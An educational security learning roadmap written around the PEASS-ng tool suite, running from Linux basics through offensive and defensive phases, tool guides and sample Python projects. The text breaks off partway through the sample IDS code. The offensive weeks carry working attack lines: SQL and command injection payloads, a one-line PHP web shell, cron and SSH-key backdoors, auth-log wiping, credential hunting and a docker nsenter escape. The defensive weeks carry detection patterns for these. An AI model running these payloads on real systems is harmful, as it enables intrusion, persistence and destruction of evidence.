# Security Learning Guide

A comprehensive roadmap for learning offensive and defensive security, tailored for the PEASS-ng development environment.

## Table of Contents

- [Getting Started](#getting-started)
- [Learning Roadmap](#learning-roadmap)
- [Daily Practice Routine](#daily-practice-routine)
- [Hands-On Labs](#hands-on-labs)
- [Tool Mastery](#tool-mastery)
- [Advanced Topics](#advanced-topics)
- [Resources](#resources)
- [Community & Certifications](#community--certifications)

---

## Getting Started

### Prerequisites

**Required knowledge:**
- Basic command line navigation (cd, ls, cat, grep)
- Understanding of file systems and permissions
- Basic networking concepts (IP addresses, ports)

**Environment setup:**

```bash
# Clone PEASS-ng (if not already done)
git clone https://github.com/peass-ng/PEASS-ng.git
cd PEASS-ng

# Enter the security research environment
nix develop .#security

# Or blue team environment
nix develop .#blueteam
```

### Your First Security Assessment

Start by auditing your own system:

```bash
# Enter blue team shell
nix develop .#blueteam

# Run a full security audit
sudo lynis audit system

# Review the findings
# Look for: warnings, suggestions, hardening index
```

**Exercise:** Fix at least 3 warnings from the Lynis report.

---

## Learning Roadmap

### Phase 1: Foundations (Weeks 1-4)

**Goal:** Master Linux fundamentals and basic security concepts

#### Week 1: Linux Command Line Mastery

**Topics:**
- File system navigation
- File permissions (chmod, chown, umask)
- Process management (ps, top, kill)
- Text processing (grep, sed, awk, cut)
- Redirection and piping

**Exercises:**

```bash
nix develop .#security

# 1. Find all SUID binaries on your system
find / -perm -4000 -type f 2>/dev/null

# 2. Understand what each one does
ls -la /usr/bin/sudo
file /usr/bin/sudo
ldd /usr/bin/sudo

# 3. Search for passwords in files (practice grep)
grep -r "password" /etc/ 2>/dev/null

# 4. Monitor processes
htop
# Find the most CPU-intensive process
# Trace what it's doing with strace
```

**Practice challenges:**
- OverTheWire Bandit (levels 0-10)
- Linux Journey (linuxjourney.com)

#### Week 2: Networking Fundamentals

**Topics:**
- TCP/IP model
- Common ports and protocols
- DNS, HTTP, SSH
- Network tools (ping, netstat, ss, ip)

**Exercises:**

```bash
nix develop .#security

# 1. Discover what services are running locally
nmap -sV localhost

# 2. Analyze each service
sudo netstat -tulpn
# Or modern alternative
ss -tulpn

# 3. Capture and analyze traffic
sudo tcpdump -i any -w /tmp/traffic.pcap
# Let it run for 1 minute, then Ctrl+C
wireshark /tmp/traffic.pcap

# 4. Understand a protocol
# Filter for HTTP in Wireshark, follow a stream
```

**Practice challenges:**
- Scan your local network (with permission!)
- Set up a simple web server and analyze its traffic
- Read: "TCP/IP Illustrated" (first 3 chapters)

#### Week 3: Web Application Basics

**Topics:**
- HTTP methods (GET, POST, PUT, DELETE)
- Cookies and sessions
- Common web vulnerabilities (OWASP Top 10)
- Browser developer tools

**Exercises:**

```bash
# Set up a vulnerable web app
docker run -d -p 8080:8080 webgoat/webgoat-8.0

# Access it at http://localhost:8080/WebGoat
# Complete the first 5 lessons
```

**Manual testing:**
```bash
nix develop .#security

# Use curl to interact with web apps
curl -v http://example.com
curl -X POST -d "username=admin&password=test" http://example.com/login
curl -H "Cookie: sessionid=abc123" http://example.com/profile

# Inspect responses
curl -I http://example.com  # Headers only
```

**Practice challenges:**
- OWASP WebGoat
- PortSwigger Web Security Academy (free)
- TryHackMe: "OWASP Top 10" room

#### Week 4: Security Fundamentals

**Topics:**
- Authentication vs Authorization
- Encryption basics (symmetric vs asymmetric)
- Hashing and password storage
- Security principles (least privilege, defense in depth)

**Exercises:**

```bash
nix develop .#security

# 1. Password cracking basics
echo "password123" | md5sum
# Create a hash
echo -n "mypassword" > /tmp/pass.txt
md5sum /tmp/pass.txt > /tmp/hash.txt

# Use john to crack it
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hash.txt

# 2. Encryption practice
# Generate GPG key
gpg --gen-key

# Encrypt a file
echo "secret data" > /tmp/secret.txt
gpg --encrypt --recipient your@email.com /tmp/secret.txt

# Decrypt it
gpg --decrypt /tmp/secret.txt.gpg
```

**Practice challenges:**
- CryptoHack (cryptohack.org)
- TryHackMe: "Encryption - Crypto 101"

---

### Phase 2: Offensive Security (Weeks 5-12)

**Goal:** Learn common attack techniques and exploitation

#### Week 5-6: Reconnaissance & Enumeration

**Topics:**
- OSINT (Open Source Intelligence)
- Active vs passive reconnaissance
- Service enumeration
- Vulnerability scanning

**Exercises:**

```bash
nix develop .#security

# 1. Comprehensive network scan
nmap -sV -sC -O -A 192.168.1.0/24
# Save results
nmap -sV -sC -oA scan_results 192.168.1.1

# 2. Web enumeration
# Find hidden directories
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://target.com/FUZZ

# 3. D-Bus enumeration (local)
dbus-send --session --print-reply \
  --dest=org.freedesktop.DBus \
  /org/freedesktop/DBus \
  org.freedesktop.DBus.ListNames

# 4. Enumerate a specific service
gdbus introspect --session \
  --dest org.freedesktop.Notifications \
  --object-path /org/freedesktop/Notifications
```

**Study LinPEAS:**
```bash
cd linPEAS
cat linpeas.sh | grep -A 20 "Checking.*SUID"
# Understand each check it performs
```

**Practice challenges:**
- TryHackMe: "Nmap", "Nmap Live Host Discovery"
- HackTheBox: Easy-rated retired boxes

#### Week 7-8: Web Application Exploitation

**Topics:**
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- File Upload vulnerabilities
- Authentication bypass

**Exercises:**

```bash
# Set up DVWA (Damn Vulnerable Web App)
docker run -d -p 80:80 vulnerables/web-dvwa

# Practice each vulnerability type:
# 1. SQL Injection
# URL: http://localhost/vulnerabilities/sqli/
# Try: ' OR '1'='1
# Try: ' UNION SELECT null, version() --

# 2. Command Injection
# URL: http://localhost/vulnerabilities/exec/
# Try: 127.0.0.1; ls -la
# Try: 127.0.0.1 | cat /etc/passwd

# 3. File Upload
# Create a simple PHP shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
# Upload and execute
```

**Manual SQL injection:**
```bash
# Use curl for testing
curl "http://target.com/page?id=1' OR '1'='1"
curl "http://target.com/page?id=1' UNION SELECT null,null,version()--"
```

**Practice challenges:**
- PortSwigger Academy (all SQL injection labs)
- TryHackMe: "SQL Injection", "OWASP Top 10"
- PentesterLab (free exercises)

#### Week 9-10: Linux Privilege Escalation

**Topics:**
- SUID/SGID binaries
- Sudo misconfigurations
- Cron jobs
- Kernel exploits
- Capabilities
- Path hijacking

**Exercises:**

```bash
nix develop .#security

# 1. Find privilege escalation vectors
./linpeas.sh

# Understand each finding:

# 2. SUID exploitation
find / -perm -4000 -type f 2>/dev/null
# Check GTFOBins for exploitation methods

# 3. Sudo misconfig
sudo -l
# Look for (ALL) NOPASSWD

# 4. Check capabilities
getcap -r / 2>/dev/null

# 5. Writable systemd units
find /etc/systemd /usr/lib/systemd -writable 2>/dev/null

# 6. Cron jobs
cat /etc/crontab
ls -la /etc/cron.*
```

**Manual exploitation practice:**
```bash
# Create a vulnerable SUID binary (for practice)
# gcc -o vuln vuln.c
# sudo chown root:root vuln
# sudo chmod 4755 vuln

# Practice exploiting it
```

**Practice challenges:**
- TryHackMe: "Linux PrivEsc", "Linux PrivEsc Arena"
- HackTheBox: "Lame", "Legacy", "Blue"
- PentesterLab: "Unix Privilege Escalation" course

#### Week 11-12: Post-Exploitation

**Topics:**
- Persistence mechanisms
- Credential harvesting
- Lateral movement
- Data exfiltration
- Covering tracks

**Exercises:**

```bash
nix develop .#security

# 1. Credential hunting
grep -r "password" /home /var/www /opt 2>/dev/null
find / -name "*password*" -o -name "*credential*" 2>/dev/null

# Search bash history
cat ~/.bash_history | grep -E "password|mysql|ssh"

# 2. Check for SSH keys
find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null

# 3. Process memory (requires root)
strings /proc/*/environ | grep -i password

# 4. Persistence examples
# Cron job
echo "* * * * * /tmp/backdoor.sh" | crontab -

# SSH key
mkdir -p ~/.ssh
echo "YOUR_PUBLIC_KEY" >> ~/.ssh/authorized_keys

# 5. Covering tracks
# Clear bash history
history -c
rm ~/.bash_history

# Clear logs (requires root)
echo "" > /var/log/auth.log
```

**Practice challenges:**
- TryHackThe: "Post-Exploitation Basics"
- HackTheBox: Medium-rated boxes

---

### Phase 3: Defensive Security (Weeks 13-16)

**Goal:** Learn to detect, prevent, and respond to attacks

#### Week 13: Monitoring & Detection

**Topics:**
- Log analysis
- Anomaly detection
- Endpoint monitoring
- Network monitoring

**Exercises:**

```bash
nix develop .#blueteam

# 1. Log analysis with lnav
lnav /var/log/auth.log /var/log/syslog

# Look for:
# - Failed login attempts
# - Sudo usage
# - New user creation
# - Suspicious commands

# 2. Real-time monitoring
sudo tail -f /var/log/auth.log | grep -i "failed\|error\|refused"

# 3. Query system state with osquery
osqueryi

# Find suspicious processes
SELECT * FROM processes WHERE parent = 0 AND name != 'systemd';

# List listening ports
SELECT DISTINCT process.name, listening.port, listening.address, process.pid
FROM processes AS process
JOIN listening_ports AS listening ON process.pid = listening.pid;

# Check for suspicious shell history
SELECT * FROM shell_history WHERE command LIKE '%wget%' OR command LIKE '%curl%';

# 4. Network monitoring
sudo iftop          # Bandwidth by connection
sudo nethogs        # Bandwidth by process

# 5. Capture suspicious traffic
sudo tcpdump -i any 'port 4444 or port 31337' -w /tmp/suspicious.pcap
```

**Detection rule writing:**
```bash
# Create a simple IDS rule (Snort-style)
alert tcp any any -> $HOME_NET 22 (msg:"SSH Brute Force Attempt";
  threshold: type both, track by_src, count 5, seconds 60;)
```

**Practice challenges:**
- CyberDefenders.org (Blue Team Labs)
- TryHackMe: "Splunk 101", "Incident Handling"

#### Week 14: Incident Response

**Topics:**
- Incident response lifecycle (PICERL)
- Forensic analysis
- Memory forensics
- Timeline creation

**Exercises:**

```bash
nix develop .#blueteam

# Scenario: You suspect a system compromise

# 1. Capture volatile data
# Network connections
sudo netstat -antp > /tmp/ir/netstat.txt
sudo ss -antp > /tmp/ir/ss.txt

# Running processes
ps auxf > /tmp/ir/processes.txt

# Logged-in users
w > /tmp/ir/users.txt

# Open files
lsof > /tmp/ir/open_files.txt

# 2. Disk forensics
# List all files with timestamps
sudo fls -r /dev/sda1 > /tmp/ir/file_list.txt

# Find recently modified files
find / -type f -mtime -1 2>/dev/null > /tmp/ir/recent_files.txt

# 3. Memory analysis (if you have a dump)
# Capture memory first
sudo dd if=/dev/mem of=/tmp/memory.dump bs=1M

# Analyze with volatility
vol -f /tmp/memory.dump linux.pslist
vol -f /tmp/memory.dump linux.bash
vol -f /tmp/memory.dump linux.netstat

# 4. Timeline creation
# Combine logs by timestamp
cat /var/log/auth.log /var/log/syslog | sort -k1,2M -k3n > /tmp/timeline.txt

# 5. Hash important files for integrity
find /bin /sbin /usr/bin -type f -exec sha256sum {} \; > /tmp/ir/hashes.txt
```

**Forensic analysis practice:**
```bash
# Analyze a suspicious binary
file /tmp/suspicious_binary
strings /tmp/suspicious_binary
hexdump -C /tmp/suspicious_binary | less

# Check what it's doing
strace /tmp/suspicious_binary
ltrace /tmp/suspicious_binary

# Reverse engineer
r2 /tmp/suspicious_binary
```

**Practice challenges:**
- CyberDefenders: "DumpMe", "Hammered"
- TryHackMe: "Volatility", "Disk Analysis & Autopsy"

#### Week 15: Hardening & Security Controls

**Topics:**
- System hardening
- Security baselines
- Access controls (DAC, MAC)
- Network segmentation
- Security automation

**Exercises:**

```bash
nix develop .#blueteam

# 1. System hardening audit
sudo lynis audit system

# Review and implement recommendations
# Common hardening steps:

# Disable unused services
sudo systemctl list-unit-files --state=enabled
sudo systemctl disable bluetooth.service

# Configure firewall
sudo ufw enable
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow 22/tcp  # SSH only

# Harden SSH
sudo nano /etc/ssh/sshd_config
# Set: PermitRootLogin no
# Set: PasswordAuthentication no
# Set: AllowUsers youruser

# 2. File integrity monitoring
sudo aide --init
sudo cp /var/lib/aide/aide.db.new /var/lib/aide/aide.db

# Check for changes
sudo aide --check

# 3. AppArmor/SELinux
# Check status
sudo aa-status

# Create a profile
sudo aa-genprof /path/to/binary

# 4. Audit logging
# Check auditd
sudo systemctl status auditd

# Add rules
sudo auditctl -w /etc/passwd -p wa -k passwd_changes

# Review logs
sudo ausearch -k passwd_changes

# 5. Security policies
# Password policy
sudo nano /etc/security/pwquality.conf
# Set minimum length, complexity

# Account lockout
sudo faillock --user username --reset
```

**Automated hardening:**
```bash
# Create a hardening script
cat > harden.sh << 'EOF'
#!/bin/bash
# System hardening script

# Update system
apt update && apt upgrade -y

# Remove unused packages
apt autoremove -y

# Configure firewall
ufw --force enable
ufw default deny incoming
ufw allow 22/tcp

# Harden SSH
sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config
systemctl restart sshd

# Enable automatic updates
apt install unattended-upgrades -y
dpkg-reconfigure -plow unattended-upgrades

echo "Hardening complete!"
EOF

chmod +x harden.sh
sudo ./harden.sh
```

**Practice challenges:**
- CIS Benchmarks (implement 10 controls)
- TryHackMe: "Linux System Hardening"

#### Week 16: Threat Hunting

**Topics:**
- Threat intelligence
- Indicators of Compromise (IOCs)
- Behavioral analysis
- Hypothesis-driven hunting

**Exercises:**

```bash
nix develop .#blueteam

# 1. Hypothesis: Attackers often create hidden processes
osqueryi "SELECT * FROM processes WHERE on_disk = 0;"

# 2. Hypothesis: Backdoors often persist via cron
osqueryi "SELECT * FROM crontab;"

# 3. Hypothesis: Lateral movement uses SSH
cat /var/log/auth.log | grep "Accepted publickey" | awk '{print $1, $2, $3, $9, $11}'

# 4. Hypothesis: Data exfiltration shows unusual network patterns
osqueryi "SELECT process.name, process.pid, pof.local_port, pof.remote_port, pof.remote_address
FROM process_open_files pof
JOIN processes process USING (pid)
WHERE pof.remote_port NOT IN (80, 443, 22, 53);"

# 5. Look for credential dumping
osqueryi "SELECT * FROM processes WHERE cmdline LIKE '%mimikatz%' OR cmdline LIKE '%secretsdump%';"

# 6. Check for webshells
find /var/www -type f -name "*.php" -exec grep -l "eval\|system\|exec\|passthru" {} \;

# 7. Detect suspicious scheduled tasks
osqueryi "SELECT * FROM crontab WHERE command LIKE '%wget%' OR command LIKE '%curl%';"

# 8. Find files in tmp with recent access
find /tmp -type f -atime -1 -exec ls -lh {} \;
```

**Advanced hunting with osquery:**
```sql
-- Processes with deleted binaries (suspicious)
SELECT * FROM processes WHERE on_disk = 0;

-- Processes listening on unusual ports
SELECT DISTINCT p.name, p.path, lp.port
FROM listening_ports lp
JOIN processes p ON lp.pid = p.pid
WHERE lp.port > 1024 AND lp.port NOT IN (3000, 8080, 8443);

-- Recently modified SUID binaries
SELECT * FROM suid_bin WHERE path IN
  (SELECT path FROM file WHERE mtime > strftime('%s', 'now') - 86400);

-- Check for persistence in systemd
SELECT * FROM startup_items WHERE type = 'systemd';
```

**Practice challenges:**
- SANS Cyber Ranges (if accessible)
- TryHackMe: "Threat Hunting" rooms
- CyberDefenders: Active threat hunting challenges

---

## Daily Practice Routine

### Morning (15 minutes)

```bash
# Security hygiene check
nix develop .#blueteam

# 1. Check system security
sudo lynis audit system | grep Warning

# 2. Review logs for anomalies
lnav /var/log/auth.log
# Look for failed logins, unusual sudo usage

# 3. Check listening ports
osqueryi "SELECT * FROM listening_ports WHERE port != 0 ORDER BY port;"

# 4. Verify file integrity
sudo aide --check | grep -E "added|removed|changed"
```

### Evening (30-60 minutes)

**Monday - Wednesday - Friday: Offensive Skills**
```bash
nix develop .#security

# Pick one:
# - Complete 1 TryHackMe room
# - Solve 1 HackTheBox challenge
# - Practice 1 PortSwigger lab
# - Read 1 chapter of security book
```

**Tuesday - Thursday: Defensive Skills**
```bash
nix develop .#blueteam

# Pick one:
# - Complete 1 CyberDefenders challenge
# - Write 1 detection rule
# - Analyze 1 PCAP file
# - Practice osquery hunting queries
```

**Saturday: Project Day**
```bash
# Build something:
# - Custom port scanner
# - Log parser
# - Simple IDS
# - Vulnerability scanner
# - PEASS-ng module
```

**Sunday: Review & Write-up**
```bash
# Document what you learned:
# - Write blog post about technique
# - Create cheat sheet
# - Contribute to PEASS-ng
# - Share knowledge with community
```

---

## Hands-On Labs

### Free Practice Platforms

**Beginner-Friendly:**
1. **TryHackMe** (tryhackme.com)
   - Guided learning paths
   - Browser-based labs
   - Good for beginners
   - Recommended rooms:
     - Complete Beginner Path
     - Jr Penetration Tester Path
     - Linux Fundamentals
     - OWASP Top 10

2. **OverTheWire** (overthewire.org)
   - Command-line focused
   - Progressive difficulty
   - Free forever
   - Start with: Bandit, Natas, Leviathan

3. **PentesterLab** (pentesterlab.com)
   - Web security focused
   - Free tier available
   - Excellent tutorials

**Intermediate:**
4. **HackTheBox** (hackthebox.eu)
   - Realistic scenarios
   - Active and retired boxes
   - Competitive environment
   - Start with: Easy-rated retired boxes

5. **VulnHub** (vulnhub.com)
   - Download VMs
   - Practice offline
   - Wide variety
   - Recommended: OSCP-like boxes

**Blue Team:**
6. **CyberDefenders** (cyberdefenders.org)
   - Blue team challenges
   - Forensics, IR, threat hunting
   - Free challenges
   - Recommended: DumpMe, Hammered

7. **Blue Team Labs Online** (blueteamlabs.online)
   - SOC analyst training
   - Realistic scenarios
   - SIEM practice

### Setting Up Local Labs

**Vulnerable Web Applications:**

```bash
# DVWA - Damn Vulnerable Web Application
docker run -d -p 80:80 vulnerables/web-dvwa
# Access: http://localhost
# Default: admin/password

# WebGoat - OWASP Training App
docker run -d -p 8080:8080 webgoat/webgoat-8.0
# Access: http://localhost:8080/WebGoat

# bWAPP - Buggy Web App
docker run -d -p 80:80 raesene/bwapp
# Access: http://localhost

# Mutillidae - OWASP Training
docker run -d -p 80:80 citizenstig/nowasp
```

**Vulnerable Linux Systems:**

```bash
# Metasploitable 3 (requires Vagrant)
git clone https://github.com/rapid7/metasploitable3
cd metasploitable3/
vagrant up

# Or use Docker-based vulnerable systems
docker run -d --name vulnbox vulnerables/cve-2014-6271
```

**Network Simulation:**

```bash
# Create isolated network for testing
docker network create -d bridge hacking-lab

# Spin up multiple containers
docker run -d --network hacking-lab --name target1 nginx
docker run -d --network hacking-lab --name target2 mysql
docker run -d --network hacking-lab --name attacker kalilinux/kali-rolling
```

---

## Tool Mastery

### Essential Tools Deep Dive

#### 1. Nmap - Network Scanner

```bash
nix develop .#security

# Basic scan
nmap 192.168.1.1

# Service version detection
nmap -sV 192.168.1.1

# OS detection
sudo nmap -O 192.168.1.1

# Aggressive scan (combines multiple options)
sudo nmap -A 192.168.1.1

# Scan specific ports
nmap -p 22,80,443 192.168.1.1

# Scan all ports
nmap -p- 192.168.1.1

# Scan entire subnet
nmap 192.168.1.0/24

# Fast scan (top 100 ports)
nmap -F 192.168.1.1

# Stealth SYN scan
sudo nmap -sS 192.168.1.1

# UDP scan
sudo nmap -sU 192.168.1.1

# Script scanning
nmap --script=vuln 192.168.1.1
nmap --script=http-enum 192.168.1.1

# Output to all formats
nmap -oA scan_results 192.168.1.1

# Practical example: Full network recon
sudo nmap -sV -sC -O -A -oA full_scan 192.168.1.0/24
```

**Practice exercises:**
1. Scan your local network, identify all devices
2. Find the version of SSH running on a target
3. Enumerate all web servers on a subnet
4. Use NSE scripts to find vulnerabilities

#### 2. Wireshark - Network Analysis

```bash
nix develop .#security

# Capture traffic
sudo tcpdump -i any -w capture.pcap

# Open in Wireshark
wireshark capture.pcap
```

**Essential Wireshark filters:**
```
# HTTP traffic
http

# Specific IP
ip.addr == 192.168.1.1

# Specific port
tcp.port == 80

# Follow TCP stream
Right-click packet > Follow > TCP Stream

# Find passwords (unencrypted)
http.request.method == "POST"

# DNS queries
dns

# SYN packets (port scanning)
tcp.flags.syn == 1 && tcp.flags.ack == 0

# Failed connections
tcp.flags.reset == 1
```

**Practice exercises:**
1. Capture your browsing traffic, find login attempts
2. Identify a port scan in a PCAP
3. Extract files from HTTP traffic
4. Analyze malware communication

#### 3. Burp Suite - Web Proxy

```bash
# Add to security shell if needed
nix develop .#security

# For now, download from portswigger.net
```

**Common workflows:**
1. **Intercept and modify requests**
   - Proxy > Intercept On
   - Browse to target
   - Modify parameters
   - Forward

2. **Spider website**
   - Target > Site map
   - Right-click domain > Spider this host

3. **Intruder (fuzzing)**
   - Send request to Intruder
   - Mark positions with §
   - Load payloads
   - Start attack

4. **Repeater (manual testing)**
   - Send request to Repeater
   - Modify and resend
   - Compare responses

**Practice exercises:**
1. Change a price in a shopping cart
2. Bypass client-side validation
3. Brute force a login form
4. Find hidden parameters

#### 4. osquery - Endpoint Visibility

```bash
nix develop .#blueteam

osqueryi
```

**Essential queries:**

```sql
-- Find all listening ports
SELECT * FROM listening_ports;

-- Processes with network connections
SELECT p.name, p.pid, pof.remote_address, pof.remote_port
FROM processes p
JOIN process_open_files pof USING (pid)
WHERE pof.remote_address != '';

-- Find SUID binaries
SELECT * FROM suid_bin;

-- User accounts
SELECT * FROM users WHERE type = 'local';

-- Cron jobs
SELECT * FROM crontab;

-- Recently installed packages
SELECT * FROM deb_packages
ORDER BY installed_date DESC
LIMIT 10;

-- Kernel modules
SELECT * FROM kernel_modules;

-- Shell history
SELECT * FROM shell_history
WHERE command LIKE '%sudo%';

-- Process tree
SELECT pid, name, parent, cmdline
FROM processes
ORDER BY parent;
```

**Practice exercises:**
1. Find all processes running as root
2. Identify programs listening on unusual ports
3. Hunt for persistence mechanisms
4. Create a scheduled query pack

#### 5. LinPEAS - Linux Privilege Escalation

```bash
nix develop .#security

# Build from source
cd linPEAS
python3 -m builder.linpeas_builder --all-no-fat --output /tmp/linpeas.sh

# Or use prebuilt
nix build .#linpeas
./result/bin/linpeas

# Run it
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh

# Save output
/tmp/linpeas.sh | tee linpeas_output.txt
```

**Understanding LinPEAS output:**

Color coding:
- **Red/Yellow**: Critical findings - likely privilege escalation
- **Green**: Interesting information
- **Blue**: Standard enumeration

Key sections to review:
1. **SUID binaries** - Can you exploit any? Check GTFOBins
2. **Sudo permissions** - Can you run anything as root?
3. **Cron jobs** - Are any writable?
4. **Writable files/folders** - Can you modify system files?
5. **Passwords in files** - Any credentials exposed?
6. **Capabilities** - Unusual capabilities on binaries?

**Practice exercises:**
1. Run LinPEAS on a TryHackMe/HTB box
2. Identify the privilege escalation vector
3. Understand WHY each finding is exploitable
4. Add a new check to LinPEAS (contribute!)

---

## Advanced Topics

### 1. Active Directory Attacks

**Common AD attack techniques:**
- Kerberoasting
- AS-REP Roasting
- Pass-the-Hash
- Golden Ticket
- Silver Ticket
- DCSync

**Learning resources:**
- TryHackMe: "Attacking Kerberos"
- HackTheBox: "Forest", "Active"
- Book: "Attacking Network Protocols"

### 2. Binary Exploitation

**Topics to master:**
- Stack buffer overflows
- Return-oriented programming (ROP)
- Format string vulnerabilities
- Heap exploitation

**Tools:**
```bash
nix develop .#security

# Debugger
gdb /path/to/binary

# With GEF enhancement
# git clone https://github.com/hugsy/gef
# echo "source ~/gef/gef.py" >> ~/.gdbinit

# Disassembly
objdump -d binary
r2 binary
```

**Learning resources:**
- Exploit Education (exploit.education)
- pwn.college
- LiveOverflow YouTube series

### 3. Malware Analysis

**Safe analysis environment:**
```bash
# Use isolated VM or container
docker run -it --rm --network none ubuntu:latest

# Install analysis tools
apt update
apt install binwalk strings file radare2
```

**Analysis workflow:**
1. Static analysis (without execution)
   ```bash
   file malware.exe
   strings malware.exe
   hexdump -C malware.exe
   binwalk malware.exe
   ```

2. Dynamic analysis (run in sandbox)
   ```bash
   strace ./malware
   ltrace ./malware
   # Monitor file system, network, registry
   ```

**Learning resources:**
- Malware Traffic Analysis (malware-traffic-analysis.net)
- TryHackMe: "Malware Analysis" rooms
- Book: "Practical Malware Analysis"

### 4. Cloud Security

**AWS Security:**
- S3 bucket enumeration
- IAM policy analysis
- EC2 metadata abuse
- Lambda exploitation

**Tools:**
- ScoutSuite (cloud security auditing)
- Pacu (AWS exploitation framework)
- CloudMapper (AWS visualization)

**Learning resources:**
- TryHackMe: "AWS Security"
- HackTheBox: "AWS Pentesting"
- flAWS.cloud (intentionally vulnerable AWS)

### 5. Container Security

**Docker security:**
```bash
nix develop .#security

# Check container privileges
docker inspect container_name | grep -i priv

# Escape attempts
# From within container:
docker run --rm -it --pid=host alpine nsenter -t 1 -m -u -n -i sh

# Scan images for vulnerabilities
docker scan image_name
```

**Kubernetes security:**
- RBAC misconfigurations
- Pod escape techniques
- Secrets management

**Learning resources:**
- TryHackMe: "Docker Security"
- Book: "Container Security" by Liz Rice

---

## Resources

### Books

**Beginner:**
- "The Hacker Playbook 3" - Peter Kim
- "Penetration Testing" - Georgia Weidman
- "Linux Basics for Hackers" - OccupyTheWeb

**Intermediate:**
- "The Web Application Hacker's Handbook" - Stuttard & Pinto
- "Rtfm: Red Team Field Manual" - Ben Clark
- "Blue Team Handbook" - Don Murdoch

**Advanced:**
- "The Shellcoder's Handbook" - Koziol et al.
- "Attacking Network Protocols" - James Forshaw
- "Practical Malware Analysis" - Sikorski & Honig

### Online Resources

**Websites:**
- [OWASP](https://owasp.org) - Web security standards
- [GTFOBins](https://gtfobins.github.io/) - Unix binary exploitation
- [LOLBAS](https://lolbas-project.github.io/) - Windows binary exploitation
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) - Attack techniques
- [HackerOne Disclosed Reports](https://hackerone.com/hacktivity) - Real bug bounties

**YouTube Channels:**
- IppSec - HackTheBox walkthroughs
- LiveOverflow - Binary exploitation
- John Hammond - CTF solutions
- The Cyber Mentor - Pentesting training
- 13Cubed - Digital forensics

**Podcasts:**
- Darknet Diaries
- Security Now
- Risky Business
- Defensive Security

**Twitter/X (Security Researchers):**
- @SwiftOnSecurity
- @malwareunicorn
- @ItsReallyNick
- @briankrebs
- @thegrugq

### Documentation

**Linux:**
- `man` pages for all commands
- [Linux Journey](https://linuxjourney.com/)
- [ExplainShell](https://explainshell.com/)

**Networking:**
- [Cisco Packet Tracer](https://www.netacad.com/courses/packet-tracer)
- RFC documents

**Web Security:**
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [OWASP Cheat Sheets](https://cheatsheetseries.owasp.org/)

---

## Community & Certifications

### Communities to Join

**Forums & Discord:**
- r/netsec - News and discussion
- r/AskNetsec - Q&A
- r/HowToHack - Learning resources
- The Cyber Mentor Discord
- HackTheBox Discord
- TryHackMe Discord

**Local:**
- BSides conferences (look for your city)
- DEFCON groups (DC groups)
- OWASP chapters
- 2600 meetings

**Conferences:**
- DEFCON (Las Vegas)
- Black Hat
- BSides (various cities)
- ShmooCon
- DerbyCon

### Certifications

**Entry Level:**
1. **CompTIA Security+**
   - General security knowledge
   - Good foundation
   - Vendor-neutral
   - Cost: ~$400

2. **eJPT** (eLearnSecurity Junior Penetration Tester)
   - Practical pentesting
   - Beginner-friendly
   - Hands-on exam
   - Cost: ~$200

**Intermediate:**
3. **CEH** (Certified Ethical Hacker)
   - Broad coverage
   - Recognized by HR
   - Multiple choice exam
   - Cost: ~$1,200

4. **GPEN** (GIAC Penetration Tester)
   - SANS training
   - Very thorough
   - Expensive but respected
   - Cost: ~$7,000

**Advanced:**
5. **OSCP** (Offensive Security Certified Professional)
   - Industry standard
   - 24-hour hands-on exam
   - "Try Harder" mentality
   - Cost: ~$1,500
   - Prep time: 3-6 months

6. **OSCE** (Offensive Security Certified Expert)
   - Advanced exploitation
   - Requires OSCP first
   - Very challenging
   - Cost: ~$1,500

**Blue Team:**
7. **BTL1** (Blue Team Level 1)
   - SOC analyst focus
   - Practical skills
   - Good value
   - Cost: ~$400

8. **GCIH** (GIAC Certified Incident Handler)
   - Incident response
   - SANS training
   - Highly respected
   - Cost: ~$7,000

**Recommended Path:**
1. Start: CompTIA Security+ (foundations)
2. Then: eJPT (offensive) OR BTL1 (defensive)
3. Goal: OSCP (offensive) OR GCIH (defensive)

---

## Building Your Own Projects

### Project Ideas

#### 1. Custom Port Scanner

```python
#!/usr/bin/env python3
import socket
import sys

def scan_port(host, port):
    """Scan a single port"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    result = sock.connect_ex((host, port))
    sock.close()
    return result == 0

def scan_host(host, ports):
    """Scan multiple ports on a host"""
    print(f"Scanning {host}...")
    open_ports = []

    for port in ports:
        if scan_port(host, port):
            print(f"[+] Port {port} is open")
            open_ports.append(port)

    return open_ports

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "localhost"
    ports = range(1, 1001)  # Scan first 1000 ports

    scan_host(target, ports)
```

**Enhancements to add:**
- Multi-threading for speed
- Service detection
- Banner grabbing
- Output to file
- Progress bar

#### 2. Log Analyzer

```python
#!/usr/bin/env python3
import re
from collections import Counter

def analyze_auth_log(logfile):
    """Analyze auth.log for security events"""

    failed_logins = []
    successful_logins = []
    sudo_commands = []

    with open(logfile) as f:
        for line in f:
            # Failed login attempts
            if "Failed password" in line:
                match = re.search(r"Failed password for (\w+) from ([\d.]+)", line)
                if match:
                    failed_logins.append((match.group(1), match.group(2)))

            # Successful logins
            if "Accepted password" in line or "Accepted publickey" in line:
                match = re.search(r"Accepted \w+ for (\w+) from ([\d.]+)", line)
                if match:
                    successful_logins.append((match.group(1), match.group(2)))

            # Sudo commands
            if "sudo:" in line:
                sudo_commands.append(line.strip())

    # Statistics
    print("=== Failed Login Analysis ===")
    fail_counter = Counter(failed_logins)
    for (user, ip), count in fail_counter.most_common(10):
        print(f"{user} from {ip}: {count} attempts")

    print("\n=== Successful Logins ===")
    for user, ip in successful_logins[-10:]:
        print(f"{user} from {ip}")

    print(f"\n=== Sudo Commands ({len(sudo_commands)}) ===")
    for cmd in sudo_commands[-5:]:
        print(cmd)

if __name__ == "__main__":
    analyze_auth_log("/var/log/auth.log")
```

**Enhancements to add:**
- Real-time monitoring
- Alert on suspicious patterns
- Export to JSON
- Dashboard/visualization

#### 3. Simple IDS (Intrusion Detection System)

```python
#!/usr/bin/env python3
from scapy.all import sniff, IP, TCP

def packet_callback(packet):
